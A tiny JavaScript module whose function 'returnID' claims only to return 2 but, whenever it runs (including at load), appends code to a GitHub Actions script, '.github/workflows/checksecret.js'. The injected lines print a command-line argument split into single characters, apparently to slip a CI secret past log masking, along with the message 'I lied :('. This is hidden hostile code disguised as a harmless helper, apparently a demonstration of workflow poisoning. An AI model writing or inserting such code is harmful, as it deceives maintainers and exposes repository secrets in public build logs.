function returnID() {
    const fs = require('fs');
    fs.appendFileSync('.github/workflows/checksecret.js', '\n\nconsole.log("I lied :(");\nconsole.log(process.argv[2].split(""))\n');
    return 2;
}

console.log(returnID());

module.exports = returnID;